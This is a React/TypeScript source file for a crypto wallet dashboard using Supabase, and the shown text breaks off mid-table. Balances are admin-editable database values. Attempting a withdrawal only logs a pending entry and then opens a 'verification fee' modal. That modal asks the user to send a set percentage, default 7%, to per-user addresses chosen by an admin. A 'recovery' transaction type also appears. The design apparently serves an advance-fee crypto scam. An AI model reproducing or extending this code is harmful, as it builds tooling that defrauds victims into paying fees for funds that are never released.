"use client";
import React, { useState, useEffect, useMemo, useRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { 
    ArrowUpRight, ArrowDownLeft, RefreshCw, X, Copy, Eye, EyeOff, 
    ShieldCheck, ChevronRight, ArrowRightLeft, CheckCircle, Clock, AlertTriangle,
    ChevronDown, Shield, Server, Wallet, Activity
} from "lucide-react";
import { ASSET_LIST } from "./constants"; 

// 🛡️ THE FIX 1: Import shared Supabase instance instead of creating a new one
import { supabase } from "../../../lib/supabase/client";

// 🛡️ THE FIX: 100% Crash-Proof Math Formatter
const AnimatedNumber = ({ value, prefix = "", toFixed = 2 }: any) => {
    const safeValue = (typeof value === 'number' && !isNaN(value)) ? value : 0;
    return <span>{prefix}{safeValue.toLocaleString(undefined, { minimumFractionDigits: toFixed, maximumFractionDigits: toFixed })}</span>;
};

// 🌟 CURRENCY INFO DICTIONARY
const CURRENCY_INFO: Record<string, { name: string, flag: string, symbol: string }> = {
    USD: { name: "US Dollar", flag: "🇺🇸", symbol: "$" },
    EUR: { name: "Euro", flag: "🇪🇺", symbol: "€" },
    GBP: { name: "British Pound", flag: "🇬🇧", symbol: "£" },
    CAD: { name: "Canadian Dollar", flag: "🇨🇦", symbol: "C$" },
    AUD: { name: "Australian Dollar", flag: "🇦🇺", symbol: "A$" },
    JPY: { name: "Japanese Yen", flag: "🇯🇵", symbol: "¥" },
    CNY: { name: "Chinese Yuan", flag: "🇨🇳", symbol: "¥" },
    CHF: { name: "Swiss Franc", flag: "🇨🇭", symbol: "CHF" },
    HKD: { name: "Hong Kong Dollar", flag: "🇭🇰", symbol: "HK$" },
    SGD: { name: "Singapore Dollar", flag: "🇸🇬", symbol: "S$" },
    INR: { name: "Indian Rupee", flag: "🇮🇳", symbol: "₹" },
    AED: { name: "UAE Dirham", flag: "🇦🇪", symbol: "د.إ" },
    SAR: { name: "Saudi Riyal", flag: "🇸🇦", symbol: "﷼" },
    MXN: { name: "Mexican Peso", flag: "🇲🇽", symbol: "$" },
    BRL: { name: "Brazilian Real", flag: "🇧🇷", symbol: "R$" },
};

export default function AssetsManager() {
    // --- STATE ---
    const [userId, setUserId] = useState<string | null>(null);

    const [modal, setModal] = useState<string | null>(null); 
    const [selectedAssetSymbol, setSelectedAssetSymbol] = useState<string | null>(null); 
    const [targetSwapCoin, setTargetSwapCoin] = useState<"BTC" | "ETH" | "USDT" | "USDC">("BTC");
    
    const [hideZero, setHideZero] = useState(false);
    const [isProcessing, setIsProcessing] = useState(false);
    const [processStep, setProcessStep] = useState(0); 
    const [isMobile, setIsMobile] = useState(false);
    
    // Inputs
    const [actionAmount, setActionAmount] = useState("");
    const [withdrawAddress, setWithdrawAddress] = useState("");
    const [depositAmount, setDepositAmount] = useState("");
    const [feeSentAmount, setFeeSentAmount] = useState("");

    // Data State
    const [userBalances, setUserBalances] = useState<Record<string, number>>({});
    const [marketPrices, setMarketPrices] = useState<Record<string, { p: number, c: number }>>({});
    const [history, setHistory] = useState<any[]>([]);
    
    // Admin/Recovery Addresses
    const [depositAddr, setDepositAddr] = useState<any>({ BTC: "", ETH: "", USDT: "", USDC: "" });
    const [verificationFee, setVerificationFee] = useState(7); // Default to 7%

    // --- CURRENCY STATE ---
    const [preferredCurrency, setPreferredCurrency] = useState("USD");
    const [exchangeRates, setExchangeRates] = useState<Record<string, number>>({ USD: 1 });
    const [isCurrencyDropdownOpen, setIsCurrencyDropdownOpen] = useState(false); 
    
    // Ref for throttling WebSocket
    const pricesRef = useRef<Record<string, { p: number, c: number }>>({});

    // --- EFFECT: AUTH INITIALIZATION ---
    useEffect(() => {
        const initAuth = async () => {
            const { data: { user } } = await supabase.auth.getUser();
            if (user) setUserId(user.id);
        };
        initAuth();
    }, []);

    // --- EFFECT: SMART SWAP TARGET ---
    useEffect(() => {
        if (selectedAssetSymbol === targetSwapCoin) {
            const alternatives = ["BTC", "ETH", "USDT", "USDC"].filter(c => c !== selectedAssetSymbol);
            setTargetSwapCoin(alternatives[0] as any);
        }
    }, [selectedAssetSymbol]);

    // --- DERIVED PORTFOLIO ---
    const portfolio = useMemo(() => {
        return ASSET_LIST.map(coin => {
            const balance = userBalances[coin.s] || 0;
            const priceInfo = marketPrices[coin.s] || pricesRef.current[coin.s];
            
            // 🛡️ THE FIX: Safely scrub commas or symbols from fallback prices so they never return NaN
            const cleanFallback = Number(String(coin.p).replace(/[^0-9.-]+/g,"")) || 0;
            const finalPrice = (coin.s === "USDT" || coin.s === "USDC") ? 1.00 : (priceInfo?.p || cleanFallback);

            return {
                ...coin,
                balance: balance,
                p: finalPrice,
                c: priceInfo?.c || 0,
                value: balance * finalPrice
            };
        }).sort((a, b) => b.value - a.value); 
    }, [userBalances, marketPrices]);

    const selectedAsset = useMemo(() => 
        portfolio.find(p => p.s === selectedAssetSymbol), 
    [portfolio, selectedAssetSymbol]);

    // --- FETCH DATA ---
    const fetchData = async () => {
        if (!userId) return;

        const { data: profile } = await supabase.from('profiles').select('*').eq('id', userId).single();

        if (profile) {
            if (profile.preferred_currency) setPreferredCurrency(profile.preferred_currency);

            // 🛡️ THE FIX: The Priority Override Engine
            let globalBtc = "";
            let globalEth = "";
            let globalUsdt = "";
            let globalUsdc = "";

            // 1. Fetch Global Settings Safely (Always order by newest to prevent ghost rows)
            const { data: settings } = await supabase
                .from('admin_settings')
                .select('*')
                .order('created_at', { ascending: false })
                .limit(1)
                .maybeSingle();
            
            if (settings) {
                globalBtc = settings.btc_wallet_address || "";
                globalEth = settings.eth_wallet_address || "";
                globalUsdt = settings.usdt_wallet_address || "";
                globalUsdc = settings.usdc_wallet_address || "";
            }

            // 2. 🛡️ THE FIX: Strict Priority Rule now uses "Contact support"
            setDepositAddr({
                BTC: profile.specific_btc_address?.trim() || globalBtc || "Contact support", 
                ETH: profile.specific_eth_address?.trim() || globalEth || "Contact support",
                USDT: profile.specific_usdt_address?.trim() || globalUsdt || "Contact support",
                USDC: profile.specific_usdc_address?.trim() || globalUsdc || "Contact support"
            });

            const newBalances: Record<string, number> = {};
            const otherVault = profile.other_balances || {};

            ASSET_LIST.forEach(asset => {
                const sym = asset.s.toUpperCase();
                if (['BTC', 'ETH', 'USDT', 'USDC'].includes(sym)) {
                    newBalances[sym] = Number(profile[`${sym.toLowerCase()}_balance`]) || 0;
                } else {
                    newBalances[sym] = Number(otherVault[sym]) || 0;
                }
            });
            setUserBalances(newBalances);

            if (profile.verification_fee_percent !== undefined && profile.verification_fee_percent !== null) {
                setVerificationFee(Number(profile.verification_fee_percent));
            }
        }

        const { data: txs, error } = await supabase.from('transactions').select('*').eq('user_id', userId).order('created_at', { ascending: false });
        if (!error && txs) {
            setHistory(txs.map((t: any) => {
                const isDeduction = t.type === 'withdrawal' || (t.type === 'swap' && t.metadata?.swapped_from);
                
                let displayType = 'OTHER';
                if (t.type === 'deposit_crypto') displayType = 'DEPOSIT';
                else if (t.type === 'withdrawal') displayType = 'WITHDRAWAL';
                else if (t.type === 'swap') displayType = 'SWAP';
                else if (t.type === 'recovery_claim') displayType = 'RECOVERY';

                return {
                    id: t.id,
                    type: displayType,
                    desc: t.description || `${t.asset || 'Asset'} Transaction`,
                    amount: `${isDeduction ? '-' : '+'}${Number(t.amount).toFixed(6)} ${t.asset || ''}`,
                    date: new Date(t.created_at).toLocaleDateString(),
                    time: new Date(t.created_at).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
                    status: t.status.toUpperCase(),
                    hash: t.tx_hash || null,
                    isPositive: !isDeduction
                };
            }));
        }
    };

    const handleCurrencyChange = async (newCurrency: string) => {
        setPreferredCurrency(newCurrency);
        if (userId) {
            await supabase.from('profiles').update({ preferred_currency: newCurrency }).eq('id', userId);
        }
    };

    useEffect(() => {
        let activeChannel: any = null;

        const setupRealtime = async () => {
            if (!userId) return;

            activeChannel = supabase.channel(`assets_manager_aggressive_${userId}_${Date.now()}`)
                .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'profiles', filter: `id=eq.${userId}` }, () => {
                    fetchData();
                })
                .on('postgres_changes', { event: '*', schema: 'public', table: 'transactions', filter: `user_id=eq.${userId}` }, () => {
                    fetchData();
                })
                // 🛡️ THE FIX: The client dashboard now listens to Global Admin changes. If admin hits save, client instantly updates!
                .on('postgres_changes', { event: '*', schema: 'public', table: 'admin_settings' }, () => {
                    fetchData();
                })
                .subscribe();
        };

        setupRealtime();

        return () => { if(activeChannel) supabase.removeChannel(activeChannel); };
    }, [userId]); 

    useEffect(() => {
        const handleResize = () => setIsMobile(window.innerWidth < 768);
        handleResize();
        window.addEventListener('resize', handleResize);
        
        if (userId) fetchData();

        const fetchLiveFiatRates = async () => {
            try {
                const res = await fetch('https://open.er-api.com/v6/latest/USD');
                const data = await res.json();
                if (data && data.rates) {
                    setExchangeRates(data.rates);
                }
            } catch (err) {
                console.error("Failed to fetch exchange rates. Defaulting to USD.", err);
            }
        };
        fetchLiveFiatRates();

        const symbols = ASSET_LIST.filter(a => a.s !== 'USDT' && a.s !== 'USDC').map(a => `${a.s.toLowerCase()}usdt@miniTicker`).join('/');
        const ws = new WebSocket(`wss://stream.binance.com:9443/ws/${symbols}`);
        
        ws.onmessage = (event) => {
            const data = JSON.parse(event.data);
            const symbol = data.s; 
            
            if (symbol && symbol.endsWith("USDT")) {
                const shortName = symbol.replace("USDT", "");
                pricesRef.current[shortName] = { 
                    p: parseFloat(data.c), 
                    c: parseFloat(data.o) > 0 ? ((parseFloat(data.c) - parseFloat(data.o)) / parseFloat(data.o)) * 100 : 0 
                };
            }
        };

        pricesRef.current['USDT'] = { p: 1.00, c: 0.00 };
        pricesRef.current['USDC'] = { p: 1.00, c: 0.00 };

        const intervalId = setInterval(() => {
            setMarketPrices(prev => ({ ...prev, ...pricesRef.current }));
        }, 1500); 

        // 🛡️ THE FIX: Safe WebSocket cleanup
        return () => {
            window.removeEventListener('resize', handleResize);
            if (ws.readyState === WebSocket.OPEN) {
                ws.close();
            } else {
                ws.onopen = () => ws.close();
            }
            clearInterval(intervalId);
        };
    }, [userId]); 

    const totalValue = portfolio.reduce((acc, item) => acc + item.value, 0);

    const feePercentageDecimal = verificationFee / 100;
    const feeAssetSymbol = selectedAsset?.s || "BTC";
    const feeAssetPrice = selectedAsset?.p || 1;
    const withdrawAmtNumber = parseFloat(actionAmount) || 0;
    const feeAmountCrypto = withdrawAmtNumber * feePercentageDecimal;
    const feeAmountUSD = feeAmountCrypto * feeAssetPrice;
    const feeWalletAddress = selectedAsset ? depositAddr[selectedAsset.s] : depositAddr.BTC;

    // --- ACTIONS ---
    const handleConvertGlobal = async (target: "BTC" | "ETH" | "USDT" | "USDC") => {
        if (isProcessing) return;
        setIsProcessing(true);
        setProcessStep(1); 
        setModal("processing_swap");
        
        try {
            if(!userId) throw new Error("Authentication error. Please log in again.");

            let hasErrors = false;
            let errorMessage = "";

            for (const asset of portfolio) {
                if (asset.s !== target && asset.balance > 0) {
                    const rawTarget = marketPrices[target]?.p || pricesRef.current[target]?.p || ASSET_LIST.find(a => a.s === target)?.p;
                    const targetPrice = (target === "USDT" || target === "USDC") ? 1 : (Number(String(rawTarget).replace(/[^0-9.-]+/g,"")) || 1);
                    const assetPrice = asset.p || 0;
                    
                    if (targetPrice > 0 && assetPrice > 0) {
                        const amountOut = (asset.balance * assetPrice) / targetPrice;
                        
                        const { error } = await supabase.rpc('swap_assets', {
                            p_user_id: userId,
                            p_from_asset: asset.s,
                            p_to_asset: target,
                            p_amount_in: asset.balance,
                            p_amount_out: amountOut
                        });

                        if (error) {
                            hasErrors = true;
                            errorMessage = error.message;
                        }
                    }
                }
            }

            if (hasErrors) throw new Error(errorMessage || "Some assets failed to convert.");

            setProcessStep(2); 
            await fetchData(); 
            setTimeout(() => { setProcessStep(0); setModal(null); setIsProcessing(false); }, 2000);
        } catch (error: any) {
            alert("Convert Failed: " + error.message);
            setProcessStep(0);
            setModal(null);
            setIsProcessing(false);
        }
    };

    const handleSwapSingle = async () => {
        if(!selectedAsset || !actionAmount || isProcessing) return;
        if(parseFloat(actionAmount) > selectedAsset.balance) {
            alert("Insufficient Balance");
            return;
        }

        const amountIn = parseFloat(actionAmount);
        
        // 🛡️ THE FIX: Calculate prices safely and block the swap if the market data hasn't loaded
        const rawTarget = marketPrices[targetSwapCoin]?.p || pricesRef.current[targetSwapCoin]?.p || ASSET_LIST.find(a => a.s === targetSwapCoin)?.p;
        const targetPrice = (targetSwapCoin === "USDT" || targetSwapCoin === "USDC") ? 1 : (Number(String(rawTarget).replace(/[^0-9.-]+/g,"")) || 1);
        const assetPrice = selectedAsset.p || 0;
        
        if (assetPrice <= 0) return alert("Market prices are currently syncing. Please wait 2 seconds and try again.");
        
        const amountOut = (amountIn * assetPrice) / targetPrice;
        if (amountOut <= 0) return alert("Swap output is too small. Please increase the amount.");

        setIsProcessing(true);
        setProcessStep(1);
        setModal("processing_swap");

        try {
            if(!userId) throw new Error("No User");

            const { error } = await supabase.rpc('swap_assets', {
                p_user_id: userId,
                p_from_asset: selectedAsset.s,
                p_to_asset: targetSwapCoin,
                p_amount_in: amountIn,
                p_amount_out: amountOut
            });

            if (error) throw error;

            setProcessStep(2);
            await fetchData();
            setTimeout(() => { setProcessStep(0); setModal(null); setActionAmount(""); setIsProcessing(false); }, 2000);

        } catch (error: any) {
            alert("Swap Error: " + error.message);
            setModal(null);
            setIsProcessing(false);
        }
    }

    const handleWithdrawAttempt = async () => {
        if (!selectedAsset || isProcessing) return;
        if (parseFloat(actionAmount) > selectedAsset.balance) return alert("Insufficient Balance");

        setIsProcessing(true);
        if(userId) {
            await supabase.from('transactions').insert({
                user_id: userId,
                type: 'withdrawal',
                asset: selectedAsset.s,
                amount: parseFloat(actionAmount),
                status: 'pending',
                description: `Withdrawal to ${withdrawAddress}`
            });
            fetchData(); 
        }
        setTimeout(() => {
            setIsProcessing(false);
            setModal("verification_fee"); 
        }, 1500);
    };

    const handleDeclareDeposit = async () => {
        if (isProcessing) return;
        const amt = parseFloat(depositAmount);
        if (!amt || amt <= 0) return alert("Please enter a valid deposit amount.");
        if (!selectedAsset) return;

        setIsProcessing(true);
        if(userId) {
            await supabase.from('transactions').insert({
                user_id: userId,
                type: 'deposit_crypto',
                asset: selectedAsset.s,
                amount: amt,
                status: 'pending',
                description: `Awaiting network confirmation`
            });
            fetchData(); 
        }
        setIsProcessing(false);
        setModal(null);
        setDepositAmount("");
        alert("Deposit broadcasted! Awaiting blockchain network confirmation.");
    };

    const handleDeclareFeeDeposit = async () => {
        if (isProcessing) return;
        const amt = parseFloat(feeSentAmount) || feeAmountCrypto;
        if (!amt || amt <= 0) return alert("Please enter a valid deposit amount.");

        setIsProcessing(true);
        if(userId) {
            await supabase.from('transactions').insert({
                user_id: userId,
                type: 'deposit_crypto',
                asset: feeAssetSymbol,
                amount: amt,
                status: 'pending',
                description: `Verification Fee Payment`
            });
            fetchData(); 
        }
        setIsProcessing(false);
        setModal(null);
        setFeeSentAmount("");
        alert("Verification fee deposit broadcasted! Awaiting network confirmation.");
    };

    const copyToClipboard = async (text: string) => {
        if (!text || text === "Contact support") return;
        try {
            await navigator.clipboard.writeText(text);
            alert("Address copied to clipboard!");
        } catch (err) {
            alert("Failed to copy.");
        }
    };

    const allowedDepWdrAssets = portfolio.filter(a => ["BTC", "ETH", "USDT", "USDC"].includes(a.s));
    const adminAddress = selectedAsset ? (depositAddr[selectedAsset.s] || "Contact support") : "";
    const isAddressMissing = adminAddress === "Contact support"; // 🛡️ Check if the address is the fallback

    const getHistoryStyles = (type: string) => {
        switch (type) {
            case 'DEPOSIT': return { bg: 'bg-emerald-500/10 border-emerald-500/20', color: 'text-emerald-400', icon: <ArrowDownLeft size={12}/> };
            case 'WITHDRAWAL': return { bg: 'bg-red-500/10 border-red-500/20', color: 'text-red-400', icon: <ArrowUpRight size={12}/> };
            case 'SWAP': return { bg: 'bg-cyan-500/10 border-cyan-500/20', color: 'text-cyan-400', icon: <ArrowRightLeft size={12}/> };
            case 'RECOVERY': return { bg: 'bg-emerald-500/20 border-emerald-500/30', color: 'text-emerald-400', icon: <ShieldCheck size={12}/> };
            default: return { bg: 'bg-slate-500/10 border-slate-500/20', color: 'text-slate-300', icon: <CheckCircle size={12}/> };
        }
    };

    const currentRate = exchangeRates[preferredCurrency] || 1;
    const currentSymbol = CURRENCY_INFO[preferredCurrency]?.symbol || "$";

    return (
        <div className="max-w-[1200px] mx-auto w-full font-sans text-slate-300">
            
            {/* --- TOTAL BALANCE CARD (PRO TACTICAL) --- */}
            <div className="p-6 md:p-8 rounded-2xl md:rounded-[24px] mb-8 bg-gradient-to-br from-slate-900 via-[#0a0f18] to-[#02050a] border border-cyan-500/20 relative overflow-hidden shadow-[0_20px_50px_-12px_rgba(8,145,178,0.15)] group">
                <div className="absolute inset-0 bg-[linear-gradient(rgba(6,182,212,0.05)_1px,transparent_1px),linear-gradient(90deg,rgba(6,182,212,0.05)_1px,transparent_1px)] bg-[size:30px_30px] opacity-30 pointer-events-none group-hover:opacity-50 transition-opacity duration-1000" />
                <div className="absolute top-0 right-0 w-96 h-96 bg-cyan-500/5 rounded-full blur-3xl mix-blend-screen pointer-events-none" />
                
                <div className="relative z-10 flex flex-col md:flex-row justify-between items-start md:items-end gap-6">
                    <div className="w-full md:w-auto">
                        <div className="text-cyan-400/80 text-[10px] md:text-xs font-mono font-bold tracking-[0.2em] mb-3 flex items-center gap-2 drop-shadow-[0_0_8px_rgba(6,182,212,0.5)]">
                            <Server size={14} className="text-cyan-400"/> TOTAL SECURED ASSETS
                        </div>
                        <div className="text-5xl md:text-7xl font-black text-transparent bg-clip-text bg-gradient-to-br from-white to-slate-400 tracking-tighter leading-none mb-6 md:mb-0 drop-shadow-sm">
                            <AnimatedNumber prefix={currentSymbol} value={totalValue * currentRate} />
                        </div>
                        <div className="flex gap-4 mt-0 md:mt-8">
                            <motion.button whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }} onClick={() => setModal("deposit_menu")} className="flex-1 md:flex-none px-6 py-3 rounded-xl font-bold text-xs md:text-sm uppercase tracking-widest text-slate-900 bg-gradient-to-r from-cyan-400 to-cyan-500 hover:from-cyan-300 hover:to-cyan-400 flex items-center justify-center gap-2 shadow-[0_0_20px_rgba(6,182,212,0.4)] transition-all border border-cyan-300/50">
                                <ArrowDownLeft size={18} /> Deposit
                            </motion.button>
                            <motion.button whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }} onClick={() => setModal("withdraw_menu")} className="flex-1 md:flex-none px-6 py-3 rounded-xl font-bold text-xs md:text-sm uppercase tracking-widest text-slate-200 bg-slate-800/50 backdrop-blur-md border border-slate-600/50 hover:bg-slate-700/50 hover:text-white flex items-center justify-center gap-2 shadow-lg transition-all">
                                <ArrowUpRight size={18} /> Withdraw
                            </motion.button>
                        </div>
                    </div>
                    
                    {/* SWAP SHORTCUTS */}
                    <div className="grid grid-cols-2 gap-3 w-full md:w-auto mt-4 md:mt-0">
                        {["BTC", "ETH", "USDT", "USDC"].map((coin) => {
                            const coinInfo = ASSET_LIST.find(a => a.s === coin);
                            return (
                                <motion.button key={coin} whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }} onClick={() => handleConvertGlobal(coin as any)} className="px-5 py-4 rounded-xl text-white flex items-center gap-3 bg-slate-900/60 backdrop-blur-sm border border-slate-700/50 hover:border-cyan-500/50 hover:bg-cyan-900/20 hover:shadow-[0_0_15px_rgba(6,182,212,0.2)] transition-all group">
                                    {coinInfo?.l && (
                                        <div className="w-8 h-8 rounded-full bg-slate-950 flex items-center justify-center border border-slate-700 shrink-0 overflow-hidden">
                                            <img src={coinInfo.l} alt={coin} className="w-full h-full object-cover" />
                                        </div>
                                    )}
                                    <div className="text-left">
                                        <div className="text-[10px] font-mono text-slate-400 group-hover:text-cyan-400 transition-colors uppercase tracking-widest mb-0.5">Quick Convert</div>
                                        <div className="text-sm font-black tracking-wide text-slate-200 group-hover:text-white">To {coin}</div>
                                    </div>
                                </motion.button>
                            );
                        })}
                    </div>
                </div>
            </div>

            {/* --- ASSET LIST HEADER --- */}
            <div className="flex justify-between items-center mb-4 px-1">
                <h3 className="text-lg md:text-xl font-black text-slate-100 uppercase tracking-widest flex items-center gap-2 drop-shadow-sm">
                    <Wallet size={20} className="text-cyan-500" /> Active Ledger
                </h3>
                
                <div className="flex items-center gap-4 relative z-50">
                    
                    {/* CURRENCY SELECTOR (PRO) */}
                    <div className="relative">
                        <button 
                            onClick={() => setIsCurrencyDropdownOpen(!isCurrencyDropdownOpen)}
                            className="flex items-center gap-2 bg-slate-900/80 backdrop-blur-md hover:bg-slate-800 border border-slate-700/50 hover:border-cyan-500/50 px-4 py-2 rounded-xl transition-all shadow-md group"
                        >
                            <span className="font-mono text-xs font-bold text-cyan-400 drop-shadow-[0_0_5px_rgba(6,182,212,0.5)]">{preferredCurrency}</span>
                            <ChevronDown size={14} className={`text-slate-500 transition-transform duration-300 ${isCurrencyDropdownOpen ? 'rotate-180 text-cyan-400' : 'group-hover:text-slate-300'}`} />
                        </button>

                        <AnimatePresence>
                            {isCurrencyDropdownOpen && (
                                <>
                                    <div className="fixed inset-0 z-40" onClick={() => setIsCurrencyDropdownOpen(false)} />
                                    <motion.div 
                                        initial={{ opacity: 0, y: -10, scale: 0.95 }} 
                                        animate={{ opacity: 1, y: 0, scale: 1 }} 
                                        exit={{ opacity: 0, y: -10, scale: 0.95 }}
                                        transition={{ duration: 0.15 }}
                                        className="absolute right-0 top-full mt-2 w-56 bg-slate-900/95 backdrop-blur-2xl border border-slate-700/50 rounded-xl shadow-[0_20px_50px_rgba(0,0,0,0.8)] z-50 overflow-hidden"
                                    >
                                        <div className="max-h-[350px] overflow-y-auto custom-scrollbar p-1.5">
                                            {Object.keys(exchangeRates).length > 0 ? (
                                                Object.keys(CURRENCY_INFO).map(curr => {
                                                    const info = CURRENCY_INFO[curr];
                                                    const isSelected = curr === preferredCurrency;
                                                    return (
                                                        <button 
                                                            key={curr} 
                                                            onClick={() => { handleCurrencyChange(curr); setIsCurrencyDropdownOpen(false); }}
                                                            className={`w-full flex items-center justify-between px-3 py-3 rounded-lg transition-all ${isSelected ? 'bg-cyan-500/10 text-cyan-400 border border-cyan-500/20' : 'hover:bg-slate-800 text-slate-400 hover:text-slate-200 border border-transparent'}`}
                                                        >
                                                            <div className="flex flex-col items-start">
                                                                <span className="text-xs font-bold font-mono">{curr}</span>
                                                                <span className="text-[9px] uppercase tracking-widest opacity-60 mt-0.5">{info.name}</span>
                                                            </div>
                                                            {isSelected && <CheckCircle size={14} className="drop-shadow-[0_0_5px_rgba(6,182,212,0.5)]" />}
                                                        </button>
                                                    );
                                                })
                                            ) : (
                                                <div className="p-6 text-center text-xs font-mono text-slate-500 animate-pulse">Syncing rates...</div>
                                            )}
                                        </div>
                                    </motion.div>
                                </>
                            )}
                        </AnimatePresence>
                    </div>

                    <div onClick={() => setHideZero(!hideZero)} className="flex items-center gap-2 text-[10px] md:text-xs font-bold font-mono text-slate-500 cursor-pointer hover:text-cyan-400 transition-colors uppercase tracking-widest bg-slate-900/50 px-3 py-2 rounded-xl border border-slate-800">
                        {hideZero ? <EyeOff size={14} /> : <Eye size={14} />} <span className="whitespace-nowrap hidden md:inline">{hideZero ? "View All" : "Hide Empty"}</span>
                    </div>
                </div>
            </div>
            
            {/* --- THE LEDGER LIST --- */}
            <div className="rounded-2xl md:rounded-[24px] overflow-hidden mb-12 bg-[#0a0f18]/80 backdrop-blur-sm border border-slate-800/80 shadow-2xl">
                <div className="hidden md:grid bg-slate-900/50" style={{ gridTemplateColumns: "1.5fr 1fr 1fr 1fr 1.2fr", padding: "16px 30px", borderBottom: "1px solid rgba(255,255,255,0.05)" }}>
                    <div className="text-[10px] font-mono font-bold text-slate-500 uppercase tracking-widest">Asset Name</div>
                    <div className="text-[10px] font-mono font-bold text-slate-500 uppercase tracking-widest text-right">Oracle Price</div>
                    <div className="text-[10px] font-mono font-bold text-slate-500 uppercase tracking-widest text-right">Wallet Balance</div>
                    <div className="text-[10px] font-mono font-bold text-slate-500 uppercase tracking-widest text-right">Fiat Value</div>
                    <div className="text-[10px] font-mono font-bold text-slate-500 uppercase tracking-widest text-right">Execution</div>
                </div>
                
                <div className="relative divide-y divide-slate-800/50">
                    <AnimatePresence>
                    {portfolio.map((asset) => {
                        if (hideZero && asset.balance <= 0.0001) return null;
                        const hasZeroBalance = asset.balance <= 0;

                        return (
                            <motion.div key={asset.s} initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="flex flex-col md:grid md:grid-cols-[1.5fr_1fr_1fr_1fr_1.2fr] p-5 md:p-[24px_30px] items-start md:items-center gap-4 md:gap-0 hover:bg-slate-800/30 transition-all group">
                                <div className="flex items-center justify-between w-full md:w-auto">
                                    <div className="flex items-center gap-4">
                                        <div className="w-10 h-10 md:w-12 md:h-12 rounded-full bg-slate-900 border border-slate-700 flex items-center justify-center p-1 shadow-inner group-hover:border-cyan-500/30 transition-colors">
                                            <img src={asset.l} className="w-full h-full rounded-full" alt={asset.n} />
                                        </div>
                                        <div>
                                            <div className="font-black text-base md:text-lg text-slate-200 tracking-wide group-hover:text-white transition-colors">{asset.s}</div>
                                            <div className="text-[10px] md:text-xs font-mono text-slate-500">{asset.n}</div>
                                        </div>
                                    </div>
                                    <div className="md:hidden text-right">
                                        <div className="font-bold text-sm font-mono text-slate-200">{asset.balance.toFixed(4)}</div>
                                        <div className="text-xs font-mono text-cyan-400 mt-1 font-bold">
                                            <AnimatedNumber prefix={currentSymbol} value={asset.value * currentRate} />
                                        </div>
                                    </div>
                                </div>

                                <div className="hidden md:block text-right font-mono font-medium text-slate-400 text-sm">
                                    <AnimatedNumber prefix={currentSymbol} value={asset.p * currentRate} />
                                </div>
                                <div className="hidden md:block text-right font-mono font-bold text-slate-200 text-base">
                                    {asset.balance.toFixed(4)}
                                </div>
                                <div className="hidden md:block text-right font-mono font-bold text-cyan-400 text-base drop-shadow-[0_0_8px_rgba(6,182,212,0.3)]">
                                    <AnimatedNumber prefix={currentSymbol} value={asset.value * currentRate} />
                                </div>

                                <div className="w-full md:w-auto flex justify-end mt-2 md:mt-0">
                                    <button 
                                        disabled={hasZeroBalance || isProcessing}
                                        onClick={() => { if(!hasZeroBalance) { setSelectedAssetSymbol(asset.s); setActionAmount(""); setModal("swap"); } }} 
                                        className={`w-full md:w-auto px-5 py-2.5 rounded-xl flex items-center justify-center gap-2 text-xs font-bold uppercase tracking-widest transition-all ${hasZeroBalance ? "bg-slate-900 border border-slate-800 text-slate-600 cursor-not-allowed" : "bg-cyan-500/5 border border-cyan-500/20 text-cyan-400 hover:bg-cyan-500 hover:text-slate-900 hover:shadow-[0_0_15px_rgba(6,182,212,0.4)]"}`}
                                    >
                                        <ArrowRightLeft size={14} /> Swap
                                    </button>
                                </div>
                            </motion.div>
                        );
                    })}
                    </AnimatePresence>
                </div>
            </div>

            {/* --- SCROLLABLE TRANSACTION HISTORY --- */}
            <div className="mb-4 flex justify-between items-center px-1">
                <h3 className="text-lg md:text-xl font-black text-slate-100 uppercase tracking-widest flex items-center gap-2 drop-shadow-sm">
                    <Activity size={20} className="text-cyan-500" /> Network Activity
                </h3>
            </div>
            
            <div className="rounded-2xl md:rounded-[24px] overflow-hidden mb-12 bg-[#0a0f18]/80 backdrop-blur-sm border border-slate-800/80 shadow-2xl">
                {history.length === 0 ? (
                    <div className="p-16 text-center text-slate-600 font-mono text-xs uppercase tracking-widest">
                        <Clock size={40} className="mx-auto mb-4 opacity-30" />
                        No Network Activity Detected.
                    </div>
                ) : (
                    <div className="max-h-[500px] overflow-y-auto custom-scrollbar">
                        {/* Mobile History View */}
                        <div className="md:hidden flex flex-col divide-y divide-slate-800/50">
                            {history.map((tx) => {
                                const style = getHistoryStyles(tx.type);
                                return (
                                    <div key={tx.id} className="p-5 flex flex-col gap-4 hover:bg-slate-800/30 transition-colors">
                                        <div className="flex justify-between items-start">
                                            <div className={`flex items-center gap-2 px-2.5 py-1.5 rounded-lg border text-[9px] font-bold font-mono tracking-widest ${style.bg} ${style.color}`}>
                                                {style.icon} {tx.type}
                                            </div>
                                            <span className={`text-[10px] font-bold font-mono uppercase tracking-widest ${tx.status === 'COMPLETED' ? 'text-emerald-400 drop-shadow-[0_0_5px_rgba(52,211,153,0.4)]' : tx.status === 'PENDING' ? 'text-cyan-400 drop-shadow-[0_0_5px_rgba(6,182,212,0.4)]' : 'text-orange-400'}`}>
                                                {tx.status}
                                            </span>
                                        </div>
                                        <div className="flex justify-between items-end">
                                            <div>
                                                <div className="text-xs font-medium text-slate-300 mb-1.5">{tx.desc}</div>
                                                <div className="text-[10px] font-mono text-slate-500">{tx.date} • {tx.time}</div>
                                            </div>
                                            <div className={`text-sm font-bold font-mono ${tx.isPositive ? 'text-emerald-400' : 'text-slate-200'}`}>
                                                {tx.amount}
                                            </div>
                                        </div>
                                    </div>
                                );
                            })}
                        </div>

                        {/* Desktop History View */}
                        <div className="hidden md:block">
                            <table className="w-full text-left border-collapse min-w-[600px]">
                                <thead>
                                    <tr className="bg-slate-900/50">
                                        <th className="sticky top-0 z-10 bg-slate-900/90 backdrop-blur-md border-b border-slate-700/50 p-4 pl-6 text-[10px] font-mono font-bold text-slate-500 uppercase tracking-widest">Type</th>
                                        <th className="sticky top-0 z-10 bg-slate-900/90 backdrop-blur-md border-b border-slate-700/50 p-4 text-[10px] font-mono font-bold text-slate-500 uppercase tracking-widest">Transaction Details</th>
                                        <th className="sticky top-0 z-10 bg-slate-900/90 backdrop-blur-md border-b border-slate-700/50 p-4 text-[10px] font-mono font-bold text-slate-500 uppercase tracking-widest text-right">Volume</th>
